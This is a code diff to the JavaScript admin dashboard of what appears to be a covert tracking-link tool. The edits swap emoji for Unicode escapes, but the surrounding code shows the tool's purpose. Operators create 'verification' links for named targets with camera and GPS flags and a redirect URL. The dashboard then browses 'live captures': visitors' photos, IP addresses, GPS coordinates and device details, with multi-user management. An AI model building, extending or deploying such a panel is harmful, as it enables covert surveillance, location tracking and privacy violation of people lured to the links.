@@ -2455,7 +2455,7 @@ async function doAdminLogin() {
         document.getElementById('adminPass').value = '';
     } finally {
         btn.disabled    = false;
-        btn.textContent = '🔓 Access Admin Dashboard';
+        btn.textContent = '\uD83D\uDD13 Access Admin Dashboard';
     }
 }
 document.getElementById('loginBtn').onclick = doAdminLogin;
@@ -2631,7 +2631,7 @@ function renderLinksTable() {
     let count = 0;
 
     if (!allLinksData || Object.keys(allLinksData).length === 0) {
-        tbody.innerHTML = '<tr><td colspan="6"><div class="empty"><span class="empty-icon">🔗</span>No links yet.</div></td></tr>';
+        tbody.innerHTML = '<tr><td colspan="6"><div class="empty"><span class="empty-icon">\uD83D\uDD17</span>No links yet.</div></td></tr>';
         document.getElementById('linkCount').innerText = '0';
         return;
     }
@@ -2648,14 +2648,14 @@ function renderLinksTable() {
         // Target Name column — always shows the actual target name
         const nameCell = `<td><a href="${verHref}" target="_blank" rel="noopener" title="Verification link: ${verHref}" style="color:var(--primary);font-weight:700;text-decoration:none;">${esc(l.name || 'Unnamed')}</a></td>`;
         // Permissions column — CAM / GPS / '—'
-        const perms = [l.cam ? '📷 CAM' : '', l.gps ? '📍 GPS' : ''].filter(Boolean);
+        const perms = [l.cam ? '\uD83D\uDCF7 CAM' : '', l.gps ? '\uD83D\uDCCD GPS' : ''].filter(Boolean);
         const permCell = `<td style="font-size:11px;">${perms.length ? perms.map(p => `<span class="tag">${p}</span>`).join(' ') : '<span style="color:#475569;">—</span>'}</td>`;
         const actionsCell = `<td style="white-space:nowrap;">
-                <button class="btn btn-gray btn-sm"   data-action="copy"   data-id="${id}">📋 Copy</button>
-                <button class="btn btn-teal btn-sm"   data-action="qr"     data-id="${id}">📱 QR</button>
+                <button class="btn btn-gray btn-sm"   data-action="copy"   data-id="${id}">\uD83D\uDCCB Copy</button>
+                <button class="btn btn-teal btn-sm"   data-action="qr"     data-id="${id}">\uD83D\uDCF1 QR</button>
                 <button class="btn btn-yellow btn-sm" data-action="rename" data-id="${id}">✏️</button>
                 <button class="btn ${l.active ? 'btn-orange' : 'btn-green'} btn-sm" data-action="toggle" data-id="${id}" data-active="${l.active}">${l.active ? '⏸' : '▶'}</button>
-                <button class="btn btn-red btn-sm"    data-action="delete" data-id="${id}">🗑</button>
+                <button class="btn btn-red btn-sm"    data-action="delete" data-id="${id}">\uD83D\uDDD1</button>
             </td>`;
 
         row.innerHTML = nameCell + permCell +
@@ -2760,7 +2760,7 @@ document.getElementById('linkTableBody').addEventListener('click', e => {
         if (l) addToBin({ ...l, _type: 'link', firebaseId: id }, 'unified_bin');
         remove(ref(db, 'managed_links/' + id));
         updateStats(); renderBin();
-        toast('🗑️ Link moved to Recycle Bin', 'var(--yellow)');
+        toast('\uD83D\uDDD1️ Link moved to Recycle Bin', 'var(--yellow)');
     }
 });
 
@@ -2827,20 +2827,20 @@ function buildCapCard(key, p, inBin = false, isUser = false) {
         const maskedId = 'masked_capture_' + String(key).slice(-4);
         card.innerHTML = `
             <div class="masked-card" style="position:relative;overflow:hidden;">
-                <div style="text-align:center;padding:20px;color:var(--purple);">👤</div>
+                <div style="text-align:center;padding:20px;color:var(--purple);">\uD83D\uDC64</div>
             </div>
             <div class="card-body">
                 <p style="font-weight:700;"><span class="masked-badge">USER</span>User Capture</p>
                 <p class="meta">Owner: <b style="color:var(--purple);">${esc(p._ownerId)}</b></p>
                 <p class="meta">Capture ID: ${maskedId}</p>
-                <p class="meta">🕐 ${esc(p.time||'')} · ${esc(p.date||'')}</p>
-                ${inBin ? `<p class="meta" style="color:var(--red);">🗑 Deleted: ${new Date(p.deletedAt).toLocaleDateString()}</p>` : ''}
+                <p class="meta">\uD83D\uDD50 ${esc(p.time||'')} · ${esc(p.date||'')}</p>
+                ${inBin ? `<p class="meta" style="color:var(--red);">\uD83D\uDDD1 Deleted: ${new Date(p.deletedAt).toLocaleDateString()}</p>` : ''}
             </div>
             <div class="card-actions">
                 ${inBin
                     ? `<button class="btn btn-green btn-sm" data-action="restore" data-key="${key}">♻️ Restore</button>
-                       <button class="btn btn-red   btn-sm" data-action="burn"    data-key="${key}">🔥 Burn</button>`
-                    : `<button class="btn btn-red btn-sm" data-action="tobin" data-key="${key}">🗑 Bin</button>`
+                       <button class="btn btn-red   btn-sm" data-action="burn"    data-key="${key}">\uD83D\uDD25 Burn</button>`
+                    : `<button class="btn btn-red btn-sm" data-action="tobin" data-key="${key}">\uD83D\uDDD1 Bin</button>`
                 }
             </div>`;
         return card;
@@ -2849,8 +2849,8 @@ function buildCapCard(key, p, inBin = false, isUser = false) {
     card.innerHTML = `
         <div class="card-img" ${p.image ? `data-lb-img="${esc(p.image)}" data-lb-info="${esc(p.linkName)} — ${esc(p.date||'')} ${esc(p.time||'')}"` : ''}>
             ${p.image
-                ? `<img data-lazy-src="${esc(p.image)}" src="" alt="Capture" style="background:var(--card3);"><div class="img-overlay">🔍</div><span class="img-badge">📷</span>`
-                : `<div class="no-img"><span>📷</span><span style="font-size:11px;">No Image</span></div>`
+                ? `<img data-lazy-src="${esc(p.image)}" src="" alt="Capture" style="background:var(--card3);"><div class="img-overlay">\uD83D\uDD0D</div><span class="img-badge">\uD83D\uDCF7</span>`
+                : `<div class="no-img"><span>\uD83D\uDCF7</span><span style="font-size:11px;">No Image</span></div>`
             }
         </div>
         <div class="card-body">
@@ -2858,21 +2858,21 @@ function buildCapCard(key, p, inBin = false, isUser = false) {
                 <input type="checkbox" class="${isUser ? 'u-cap-select' : 'cap-select'}" data-key="${key}"> <b>${esc(p.linkName)}</b>
             </label>` : `<p style="font-weight:700;margin-bottom:4px;">${esc(p.linkName)}</p>`}
             <p class="meta"><span class="tag">${esc(d.os||'?')}</span><span class="tag">${esc(d.browser||'?')}</span></p>
-            <p class="meta">🌐 ${esc(p.ipAddress||'N/A')}</p>
-            <p class="meta">📍 ${hasGPS
+            <p class="meta">\uD83C\uDF10 ${esc(p.ipAddress||'N/A')}</p>
+            <p class="meta">\uD83D\uDCCD ${hasGPS
                 ? `<a href="https://www.google.com/maps?q=${p.latitude},${p.longitude}" target="_blank" style="color:var(--teal);">View Map</a>`
                 : 'GPS Denied'}</p>
-            <p class="meta">🕐 ${esc(p.time||'')} · ${esc(p.date||'')}</p>
-            ${inBin ? `<p class="meta" style="color:var(--red);">🗑 Deleted: ${new Date(p.deletedAt).toLocaleDateString()}</p>` : ''}
+            <p class="meta">\uD83D\uDD50 ${esc(p.time||'')} · ${esc(p.date||'')}</p>
+            ${inBin ? `<p class="meta" style="color:var(--red);">\uD83D\uDDD1 Deleted: ${new Date(p.deletedAt).toLocaleDateString()}</p>` : ''}
         </div>
         <div class="card-actions">
             ${p.image ? `<button class="btn btn-teal btn-sm" data-action="download" data-key="${key}">⬇ Save</button>` : ''}
-            ${hasGPS  ? `<button class="btn btn-gray btn-sm" data-action="copygps" data-key="${key}">📍 GPS</button>` : ''}
-            <button class="btn btn-primary btn-sm" data-action="showInfo" data-key="${key}">📋 Info</button>
+            ${hasGPS  ? `<button class="btn btn-gray btn-sm" data-action="copygps" data-key="${key}">\uD83D\uDCCD GPS</button>` : ''}
+            <button class="btn btn-primary btn-sm" data-action="showInfo" data-key="${key}">\uD83D\uDCCB Info</button>
             ${inBin
                 ? `<button class="btn btn-green btn-sm" data-action="restore" data-key="${key}">♻️ Restore</button>
-                   <button class="btn btn-red   btn-sm" data-action="burn"    data-key="${key}">🔥 Burn</button>`
-                : `<button class="btn btn-red   btn-sm" data-action="tobin"   data-key="${key}">🗑 Bin</button>`
+                   <button class="btn btn-red   btn-sm" data-action="burn"    data-key="${key}">\uD83D\uDD25 Burn</button>`
+                : `<button class="btn btn-red   btn-sm" data-action="tobin"   data-key="${key}">\uD83D\uDDD1 Bin</button>`
             }
         </div>`;
     return card;
@@ -2885,7 +2885,7 @@ function renderLogs() {
     selectedCaptures.clear();
 
     if (!allLogsData || Object.keys(allLogsData).length === 0) {
-        grid.innerHTML = '<div class="empty"><span class="empty-icon">📭</span>No captures yet.</div>';
+        grid.innerHTML = '<div class="empty"><span class="empty-icon">\uD83D\uDCED</span>No captures yet.</div>';
         document.getElementById('logCount').innerText = '0';
         return;
     }
@@ -2902,7 +2902,7 @@ function renderLogs() {
     });
 
     document.getElementById('logCount').innerText = keys.length;
-    if (keys.length === 0) grid.innerHTML = '<div class="empty"><span class="empty-icon">🔍</span>No captures match your filters.</div>';
+    if (keys.length === 0) grid.innerHTML = '<div class="empty"><span class="empty-icon">\uD83D\uDD0D</span>No captures match your filters.</div>';
     observeLazyImages(grid);
 }
 
@@ -2917,7 +2917,7 @@ function renderRecent() {
         .sort((a,b) => (allLogsData[b].timestamp||0) - (allLogsData[a].timestamp||0))
         .slice(0, 4);
 
-    if (keys.length === 0) { grid.innerHTML = '<div class="empty"><span class="empty-icon">📭</span>No captures yet.</div>'; return; }
+    if (keys.length === 0) { grid.innerHTML = '<div class="empty"><span class="empty-icon">\uD83D\uDCED</span>No captures yet.</div>'; return; }
     keys.forEach(k => {
         logsCache[k] = allLogsData[k];
         grid.appendChild(buildCapCard(k, allLogsData[k], false));
@@ -2941,14 +2941,14 @@ function handleCapCardClick(e, cacheRef, binKey, isUser = false) {
 
     if (action === 'download' && (p == null ? undefined : p.image))   dlImg(p.image, `capture_${p.linkName||'x'}_${Date.now()}.jpg`);
     else if (action === 'showInfo')          openInfoModal(p);
-    else if (action === 'copygps' && p)      navigator.clipboard.writeText(p.latitude + ', ' + p.longitude).then(() => toast('📍 GPS copied!', 'var(--teal)'));
+    else if (action === 'copygps' && p)      navigator.clipboard.writeText(p.latitude + ', ' + p.longitude).then(() => toast('\uD83D\uDCCD GPS copied!', 'var(--teal)'));
     else if (action === 'tobin' && p) {
         if (!confirm('Move to Recycle Bin?')) return;
         addToBin({ ...p, _type: 'photo', _firebaseKey: key }, binKey);
         remove(ref(db, 'photo_history/' + key));
         if (isUser) { renderUserBin(); updateUserStats(); }
         else        { renderBin(); updateStats(); }
-        toast('🗑️ Moved to Recycle Bin', 'var(--yellow)');
+        toast('\uD83D\uDDD1️ Moved to Recycle Bin', 'var(--yellow)');
     }
 }
 
@@ -2982,7 +2982,7 @@ document.getElementById('bulkDeleteBtn').onclick = () => {
     selectedCaptures.clear();
     const sa = document.getElementById('selectAllCaptures'); if (sa) sa.checked = false;
     renderBin(); updateStats();
-    toast(`🗑️ ${count} capture(s) moved to bin.`, 'var(--yellow)');
+    toast(`\uD83D\uDDD1️ ${count} capture(s) moved to bin.`, 'var(--yellow)');
 };
 
 // ══════════════════════════════════════════════════════════
@@ -3007,7 +3007,7 @@ function renderBin() {
     else items.sort((a,b) => (b.deletedAt||0) - (a.deletedAt||0));
 
     grid.innerHTML = '';
-    if (items.length === 0) { grid.innerHTML = '<div class="empty"><span class="empty-icon">🗑️</span>Recycle bin is empty.</div>'; return; }
+    if (items.length === 0) { grid.innerHTML = '<div class="empty"><span class="empty-icon">\uD83D\uDDD1️</span>Recycle bin is empty.</div>'; return; }
 
     items.forEach(item => {
         if (item._type === 'photo') {
@@ -3020,14 +3020,14 @@ function renderBin() {
             const card = document.createElement('div');
             card.className = 'lbin-card';
             card.innerHTML = `
-                <p><b>🔗 ${esc(item.name||'Unknown')}</b></p>
-                <p class="meta">${item.cam ? '📷 Camera' : ''} ${item.gps ? '📍 GPS' : ''}</p>
+                <p><b>\uD83D\uDD17 ${esc(item.name||'Unknown')}</b></p>
+                <p class="meta">${item.cam ? '\uD83D\uDCF7 Camera' : ''} ${item.gps ? '\uD83D\uDCCD GPS' : ''}</p>
                 ${item.redirectUrl ? `<p class="meta">↩️ ${esc(item.redirectUrl)}</p>` : ''}
-                <p class="meta">👁 ${item.visits||0} visits</p>
-                <p class="meta" style="color:var(--red);">🗑 Deleted: ${new Date(item.deletedAt).toLocaleDateString()}</p>
+                <p class="meta">\uD83D\uDC41 ${item.visits||0} visits</p>
+                <p class="meta" style="color:var(--red);">\uD83D\uDDD1 Deleted: ${new Date(item.deletedAt).toLocaleDateString()}</p>
                 <div style="display:flex;gap:6px;margin-top:10px;">
                     <button class="btn btn-green btn-sm" data-bin-type="link" data-bin-action="restore" data-fid="${esc(item.firebaseId)}" style="flex:1;">♻️ Restore</button>
-                    <button class="btn btn-red   btn-sm" data-bin-type="link" data-bin-action="burn"    data-fid="${esc(item.firebaseId)}" style="flex:1;">🔥 Burn</button>
+                    <button class="btn btn-red   btn-sm" data-bin-type="link" data-bin-action="burn"    data-fid="${esc(item.firebaseId)}" style="flex:1;">\uD83D\uDD25 Burn</button>
                 </div>`;
             grid.appendChild(card);
         }
@@ -3051,7 +3051,7 @@ document.getElementById('binGrid').addEventListener('click', e => {
             set(ref(db, 'managed_links/' + fid), toRestore).then(() => { saveBin(bin.filter(x => !(x._type==='link' && x.firebaseId===fid)), 'unified_bin'); renderBin(); updateStats(); toast('♻️ Link restored!', 'var(--green)'); });
         } else if (action === 'burn') {
             if (!confirm('Permanently delete this link?')) return;
-            saveBin(bin.filter(x => !(x._type==='link' && x.firebaseId===fid)), 'unified_bin'); renderBin(); updateStats(); toast('🔥 Link permanently deleted.', 'var(--red)');
+            saveBin(bin.filter(x => !(x._type==='link' && x.firebaseId===fid)), 'unified_bin'); renderBin(); updateStats(); toast('\uD83D\uDD25 Link permanently deleted.', 'var(--red)');
         }
         return;
     }
@@ -3065,7 +3065,7 @@ document.getElementById('binGrid').addEventListener('click', e => {
 
     if (action === 'download' && item.image) dlImg(item.image, `capture_${item.linkName||'x'}_${Date.now()}.jpg`);
     else if (action === 'showInfo') openInfoModal(item);
-    else if (action === 'copygps' && item.latitude && item.latitude !== 'Denied') navigator.clipboard.writeText(item.latitude + ', ' + item.longitude).then(() => toast('📍 GPS copied!', 'var(--teal)'));
+    else if (action === 'copygps' && item.latitude && item.latitude !== 'Denied') navigator.clipboard.writeText(item.latitude + ', ' + item.longitude).then(() => toast('\uD83D\uDCCD GPS copied!', 'var(--teal)'));
     else if (action === 'restore') {
         if (!confirm('Restore this capture to Firebase?')) return;
         const toRestore = { ...item }; delete toRestore.deletedAt; delete toRestore._type; delete toRestore._firebaseKey; delete toRestore._binId;
@@ -3074,7 +3074,7 @@ document.getElementById('binGrid').addEventListener('click', e => {
         renderBin(); updateStats(); toast('♻️ Capture restored!', 'var(--green)');
     } else if (action === 'burn') {
         if (!confirm('Permanently delete? Cannot be undone.')) return;
-        saveBin(bin.filter(x => x._binId !== binId), 'unified_bin'); renderBin(); updateStats(); toast('🔥 Permanently deleted.', 'var(--red)');
+        saveBin(bin.filter(x => x._binId !== binId), 'unified_bin'); renderBin(); updateStats(); toast('\uD83D\uDD25 Permanently deleted.', 'var(--red)');
     }
 });
 
@@ -3090,9 +3090,9 @@ document.querySelectorAll('.bin-tab:not([data-ctx])').forEach(tab => {
 });
 document.getElementById('binSearch').addEventListener('input', renderBin);
 document.getElementById('binSortFilter').addEventListener('change', renderBin);
-document.getElementById('emptyAllBinBtn').onclick = () => { if (!confirm('Empty all?')) return; saveBin([], 'unified_bin'); renderBin(); updateStats(); toast('🔥 Bin emptied.', 'var(--red)'); };
-document.getElementById('emptyBinPhotoBtn').onclick = () => { if (!confirm('Delete all photos from bin?')) return; saveBin(getBin('unified_bin').filter(x => x._type !== 'photo'), 'unified_bin'); renderBin(); updateStats(); toast('🔥 Photo captures cleared.', 'var(--red)'); };
-document.getElementById('emptyBinLinkBtn').onclick  = () => { if (!confirm('Delete all links from bin?')) return; saveBin(getBin('unified_bin').filter(x => x._type !== 'link'), 'unified_bin'); renderBin(); updateStats(); toast('🔥 Links cleared.', 'var(--red)'); };
+document.getElementById('emptyAllBinBtn').onclick = () => { if (!confirm('Empty all?')) return; saveBin([], 'unified_bin'); renderBin(); updateStats(); toast('\uD83D\uDD25 Bin emptied.', 'var(--red)'); };
+document.getElementById('emptyBinPhotoBtn').onclick = () => { if (!confirm('Delete all photos from bin?')) return; saveBin(getBin('unified_bin').filter(x => x._type !== 'photo'), 'unified_bin'); renderBin(); updateStats(); toast('\uD83D\uDD25 Photo captures cleared.', 'var(--red)'); };
+document.getElementById('emptyBinLinkBtn').onclick  = () => { if (!confirm('Delete all links from bin?')) return; saveBin(getBin('unified_bin').filter(x => x._type !== 'link'), 'unified_bin'); renderBin(); updateStats(); toast('\uD83D\uDD25 Links cleared.', 'var(--red)'); };
 
 // ══════════════════════════════════════════════════════════
 // ADMIN: USER MANAGEMENT
@@ -3114,7 +3114,7 @@ function renderUsersList() {
 
     if (!container) return;
     if (!allUsersData || count === 0) {
-        container.innerHTML = '<div class="empty"><span class="empty-icon">👥</span>No users created yet. Click Add User to get started.</div>';
+        container.innerHTML = '<div class="empty"><span class="empty-icon">\uD83D\uDC65</span>No users created yet. Click Add User to get started.</div>';
         return;
     }
 
@@ -3126,10 +3126,10 @@ function renderUsersList() {
 
         const perms = u.permissions || {};
         const permLabels = [
-            perms.linkGenerator ? '🔗 Links' : null,
-            perms.liveCaptures  ? '📸 Captures' : null,
-            perms.recycleBin    ? '🗑️ Bin' : null,
-            perms.exportData    ? '📥 Export' : null,
+            perms.linkGenerator ? '\uD83D\uDD17 Links' : null,
+            perms.liveCaptures  ? '\uD83D\uDCF8 Captures' : null,
+            perms.recycleBin    ? '\uD83D\uDDD1️ Bin' : null,
+            perms.exportData    ? '\uD83D\uDCE5 Export' : null,
         ].filter(Boolean).join(', ') || 'No permissions';
 
         item.innerHTML = `
@@ -3150,9 +3150,9 @@ function renderUsersList() {
                     ${u.active ? '⏸ Disable' : '▶ Enable'}
                 </button>
                 <button class="btn btn-yellow btn-sm" data-ua="edit"     data-uname="${esc(username)}">✏️ Edit</button>
-                <button class="btn btn-teal   btn-sm" data-ua="changepw" data-uname="${esc(username)}">🔑 PW</button>
-                <button class="btn btn-primary btn-sm" data-ua="activity" data-uname="${esc(username)}">📊 Activity</button>
-                <button class="btn btn-red    btn-sm" data-ua="delete"   data-uname="${esc(username)}">🗑 Delete</button>
+                <button class="btn btn-teal   btn-sm" data-ua="changepw" data-uname="${esc(username)}">\uD83D\uDD11 PW</button>
+                <button class="btn btn-primary btn-sm" data-ua="activity" data-uname="${esc(username)}">\uD83D\uDCCA Activity</button>
+                <button class="btn btn-red    btn-sm" data-ua="delete"   data-uname="${esc(username)}">\uD83D\uDDD1 Delete</button>
             </div>`;
         container.appendChild(item);
     });
@@ -3199,7 +3199,7 @@ document.getElementById('usersSection').addEventListener('click', e => {
         remove(ref(db, 'users/' + uname));
         // Clean up user's Firebase recycle bin (orphaned data)
         remove(ref(db, 'recycle_bin/' + uname)).catch(() => {});
-        toast(`🗑️ User ${uname} deleted.`, 'var(--red)');
+        toast(`\uD83D\uDDD1️ User ${uname} deleted.`, 'var(--red)');
     }
 });
 
@@ -3253,7 +3253,7 @@ document.getElementById('saveUserBtn').onclick = async () => {
             msg.style.color = 'var(--red)';
             msg.innerText = '❌ Update failed: ' + (e.message || 'Unknown error');
         } finally {
-            saveBtn2.disabled = false; saveBtn2.innerText = '💾 Save';
+            saveBtn2.disabled = false; saveBtn2.innerText = '\uD83D\uDCBE Save';
         }
     } else {
         // Try duplicate check — if Firebase rules block the read, skip it and let the write decide
@@ -3301,7 +3301,7 @@ document.getElementById('saveUserBtn').onclick = async () => {
             msg.innerText = reason;
         } finally {
             saveBtn.disabled = false;
-            saveBtn.innerText = '💾 Save';
+            saveBtn.innerText = '\uD83D\uDCBE Save';
         }
     }
 };
@@ -3391,24 +3391,24 @@ async function showUserActivity(username) {
         const imgBlock = p.image
             ? `<div style="position:relative;cursor:zoom-in;" onclick="activityLightbox('${safeImg}','${ex(p.linkName||'')} — ${ex(p.date||'')} ${ex(p.time||'')}')">
                    <img data-lazy-src="${p.image}" src="" style="width:100%;height:140px;object-fit:cover;object-position:center top;display:block;background:var(--card3);" alt="Capture">
-                   <div style="position:absolute;inset:0;background:rgba(0,0,0,0);display:flex;align-items:center;justify-content:center;opacity:0;transition:all .2s;font-size:22px;" onmouseover="this.style.opacity=1;this.style.background='rgba(0,0,0,.35)'" onmouseout="this.style.opacity=0;this.style.background='rgba(0,0,0,0)'">🔍</div>
-                   <span style="position:absolute;top:6px;right:6px;background:rgba(0,0,0,.6);color:#fff;border-radius:5px;padding:1px 6px;font-size:10px;font-weight:700;">📷</span>
+                   <div style="position:absolute;inset:0;background:rgba(0,0,0,0);display:flex;align-items:center;justify-content:center;opacity:0;transition:all .2s;font-size:22px;" onmouseover="this.style.opacity=1;this.style.background='rgba(0,0,0,.35)'" onmouseout="this.style.opacity=0;this.style.background='rgba(0,0,0,0)'">\uD83D\uDD0D</div>
+                   <span style="position:absolute;top:6px;right:6px;background:rgba(0,0,0,.6);color:#fff;border-radius:5px;padding:1px 6px;font-size:10px;font-weight:700;">\uD83D\uDCF7</span>
                </div>`
-            : `<div style="height:80px;background:var(--card3);display:flex;align-items:center;justify-content:center;color:var(--muted);font-size:12px;flex-direction:column;gap:4px;"><span>📷</span><span>No Image</span></div>`;
+            : `<div style="height:80px;background:var(--card3);display:flex;align-items:center;justify-content:center;color:var(--muted);font-size:12px;flex-direction:column;gap:4px;"><span>\uD83D\uDCF7</span><span>No Image</span></div>`;
 
         const deviceRows = [
-            ['🌐 IP',        p.ipAddress||'N/A'],
-            ['💻 OS',        d.os||'N/A'],
-            ['🌍 Browser',   d.browser||'N/A'],
-            ['📱 Platform',  d.platform||'N/A'],
-            ['🖥 Screen',    d.screenWidth ? d.screenWidth+'×'+d.screenHeight : 'N/A'],
-            ['🔋 Battery',   d.battery ? d.battery+(d.charging==='Yes'?' ⚡':'') : 'N/A'],
-            ['📶 Network',   d.networkType||'N/A'],
-            ['🗺 Timezone',  d.timezone||'N/A'],
-            ['🗣 Language',  d.language||'N/A'],
-            ['📅 Date',      p.date||'N/A'],
-            ['🕐 Time',      p.time||'N/A'],
-            ['📍 GPS',       hasGPS ? p.latitude+', '+p.longitude : 'Denied'],
+            ['\uD83C\uDF10 IP',        p.ipAddress||'N/A'],
+            ['\uD83D\uDCBB OS',        d.os||'N/A'],
+            ['\uD83C\uDF0D Browser',   d.browser||'N/A'],
+            ['\uD83D\uDCF1 Platform',  d.platform||'N/A'],
+            ['\uD83D\uDDA5 Screen',    d.screenWidth ? d.screenWidth+'×'+d.screenHeight : 'N/A'],
+            ['\uD83D\uDD0B Battery',   d.battery ? d.battery+(d.charging==='Yes'?' ⚡':'') : 'N/A'],
+            ['\uD83D\uDCF6 Network',   d.networkType||'N/A'],
+            ['\uD83D\uDDFA Timezone',  d.timezone||'N/A'],
+            ['\uD83D\uDDE3 Language',  d.language||'N/A'],
+            ['\uD83D\uDCC5 Date',      p.date||'N/A'],
+            ['\uD83D\uDD50 Time',      p.time||'N/A'],
+            ['\uD83D\uDCCD GPS',       hasGPS ? p.latitude+', '+p.longitude : 'Denied'],
         ].map(([k,v]) =>
             `<div style="display:flex;justify-content:space-between;padding:3px 0;border-bottom:1px solid var(--border);font-size:10.5px;">
                 <span style="color:var(--muted);">${k}</span>
@@ -3418,7 +3418,7 @@ async function showUserActivity(username) {
 
         const actBtns = [
             p.image ? `<button onclick="activityDownload('${safeImg}','capture_${ex(p.linkName||'x')}_${p.timestamp||Date.now()}.jpg')" style="flex:1;padding:5px 8px;background:var(--teal);color:#fff;border:none;border-radius:6px;font-size:11px;font-weight:600;cursor:pointer;">⬇ Save</button>` : '',
-            hasGPS  ? `<a href="${mapUrl}" target="_blank" style="flex:1;padding:5px 8px;background:var(--green);color:#fff;border-radius:6px;font-size:11px;font-weight:600;text-decoration:none;text-align:center;">🗺 Map</a>` : '',
+            hasGPS  ? `<a href="${mapUrl}" target="_blank" style="flex:1;padding:5px 8px;background:var(--green);color:#fff;border-radius:6px;font-size:11px;font-weight:600;text-decoration:none;text-align:center;">\uD83D\uDDFA Map</a>` : '',
         ].filter(Boolean).join('');
 
         return `
@@ -3441,16 +3441,16 @@ async function showUserActivity(username) {
             ? `<div style="cursor:zoom-in;" onclick="activityLightbox('${safeImg}','${ex(x.linkName||'')}')">
                    <img data-lazy-src="${x.image}" src="" style="width:100%;height:110px;object-fit:cover;display:block;filter:grayscale(.4) brightness(.8);background:var(--card3);" alt="Capture">
                </div>`
-            : `<div style="height:60px;background:var(--card3);display:flex;align-items:center;justify-content:center;color:var(--muted);font-size:12px;opacity:.6;flex-direction:column;gap:2px;"><span>📷</span><span>No Image</span></div>`;
+            : `<div style="height:60px;background:var(--card3);display:flex;align-items:center;justify-content:center;color:var(--muted);font-size:12px;opacity:.6;flex-direction:column;gap:2px;"><span>\uD83D\uDCF7</span><span>No Image</span></div>`;
         return `
         <div style="background:var(--card);border:1px solid #2d1a1a;border-radius:10px;overflow:hidden;opacity:.88;">
             ${imgBlock}
             <div style="padding:8px 10px;font-size:11px;">
                 <div style="font-weight:700;color:var(--text);">${ex(x.linkName||'Unknown')}</div>
-                <div style="color:var(--muted);margin-top:2px;">🌐 ${ex(x.ipAddress||'N/A')} · ${ex(d.os||'?')} · ${ex(d.browser||'?')}</div>
-                <div style="color:var(--muted);">📍 ${hasGPS ? x.latitude+', '+x.longitude : 'Denied'}</div>
-                <div style="color:var(--muted);">🕐 ${ex(x.date||'')} ${ex(x.time||'')}</div>
-                <div style="color:var(--red);margin-top:4px;font-weight:600;">🗑 Deleted: ${new Date(x.deletedAt||0).toLocaleDateString()}</div>
+                <div style="color:var(--muted);margin-top:2px;">\uD83C\uDF10 ${ex(x.ipAddress||'N/A')} · ${ex(d.os||'?')} · ${ex(d.browser||'?')}</div>
+                <div style="color:var(--muted);">\uD83D\uDCCD ${hasGPS ? x.latitude+', '+x.longitude : 'Denied'}</div>
+                <div style="color:var(--muted);">\uD83D\uDD50 ${ex(x.date||'')} ${ex(x.time||'')}</div>
+                <div style="color:var(--red);margin-top:4px;font-weight:600;">\uD83D\uDDD1 Deleted: ${new Date(x.deletedAt||0).toLocaleDateString()}</div>
                 ${x.image ? `<button onclick="activityDownload('${safeImg}','del_capture_${x.timestamp||Date.now()}.jpg')" style="margin-top:6px;width:100%;padding:4px;background:var(--teal);color:#fff;border:none;border-radius:5px;font-size:10.5px;font-weight:600;cursor:pointer;">⬇ Save</button>` : ''}
             </div>
         </div>`;
@@ -3462,7 +3462,7 @@ async function showUserActivity(username) {
         const status = l.active
             ? `<span style="color:var(--green);font-weight:700;font-size:11px;">● Active</span>`
             : `<span style="color:var(--red);font-weight:700;font-size:11px;">● Off</span>`;
-        const perms = [l.cam?'📷 Cam':'', l.gps?'📍 GPS':''].filter(Boolean).join(' · ') || '—';
+        const perms = [l.cam?'\uD83D\uDCF7 Cam':'', l.gps?'\uD83D\uDCCD GPS':''].filter(Boolean).join(' · ') || '—';
         const redir = l.redirectUrl
             ? `<a href="${ex(l.redirectUrl)}" target="_blank" style="color:var(--teal);font-size:10.5px;">${ex(l.redirectUrl.slice(0,30))}…</a>`
             : '<span style="color:#475569;font-size:10.5px;">—</span>';
@@ -3472,20 +3472,20 @@ async function showUserActivity(username) {
             <td style="padding:8px 10px;font-size:11px;color:var(--muted);">${perms}</td>
             <td style="padding:8px 10px;">${redir}</td>
             <td style="padding:8px 10px;">${status}</td>
-            <td style="padding:8px 10px;color:var(--yellow);font-weight:700;font-size:12px;">👁 ${l.visits||0}</td>
+            <td style="padding:8px 10px;color:var(--yellow);font-weight:700;font-size:12px;">\uD83D\uDC41 ${l.visits||0}</td>
             <td style="padding:8px 10px;font-size:10.5px;color:var(--muted);">${l.createdAt ? new Date(l.createdAt).toLocaleDateString() : '—'}</td>
         </tr>`;
     };
 
     // ── deleted link row
     const delLinkRow = x => {
-        const perms = [x.cam?'📷 Cam':'', x.gps?'📍 GPS':''].filter(Boolean).join(' · ') || '—';
+        const perms = [x.cam?'\uD83D\uDCF7 Cam':'', x.gps?'\uD83D\uDCCD GPS':''].filter(Boolean).join(' · ') || '—';
         return `
         <tr style="opacity:.85;">
             <td style="padding:8px 10px;font-weight:600;font-size:12px;color:var(--text);">${ex(x.name||'Unnamed')}</td>
             <td style="padding:8px 10px;font-size:11px;color:var(--muted);">${perms}</td>
-            <td style="padding:8px 10px;color:var(--yellow);font-size:12px;">👁 ${x.visits||0}</td>
-            <td style="padding:8px 10px;color:var(--red);font-size:11px;font-weight:600;">🗑 ${new Date(x.deletedAt||0).toLocaleDateString()}</td>
+            <td style="padding:8px 10px;color:var(--yellow);font-size:12px;">\uD83D\uDC41 ${x.visits||0}</td>
+            <td style="padding:8px 10px;color:var(--red);font-size:11px;font-weight:600;">\uD83D\uDDD1 ${new Date(x.deletedAt||0).toLocaleDateString()}</td>
         </tr>`;
     };
 
@@ -3543,7 +3543,7 @@ async function showUserActivity(username) {
 
         <!-- Generated Links -->
         ${section(
-            '🔗 Generated Links (' + sortedLinks.length + ')',
+            '\uD83D\uDD17 Generated Links (' + sortedLinks.length + ')',
             sortedLinks.length === 0
                 ? emptyState('No links created yet.')
                 : linksTable(
@@ -3554,7 +3554,7 @@ async function showUserActivity(username) {
 
         <!-- Live Captures -->
         ${section(
-            '📸 Live Captures (' + sortedCaptures.length + ')',
+            '\uD83D\uDCF8 Live Captures (' + sortedCaptures.length + ')',
             sortedCaptures.length === 0
                 ? emptyState('No captures yet.')
                 : capGrid(sortedCaptures.map(capCard).join(''))
@@ -3562,7 +3562,7 @@ async function showUserActivity(username) {
 
         <!-- Deleted Links (Bin) -->
         ${section(
-            '🗑️ Deleted Links (' + sortedDelLinks.length + ')',
+            '\uD83D\uDDD1️ Deleted Links (' + sortedDelLinks.length + ')',
             sortedDelLinks.length === 0
                 ? emptyState('No deleted links.')
                 : linksTable(
@@ -3573,7 +3573,7 @@ async function showUserActivity(username) {
 
         <!-- Deleted Captures (Bin) -->
         ${section(
-            '🗑️ Deleted Captures (' + sortedDelCaps.length + ')',
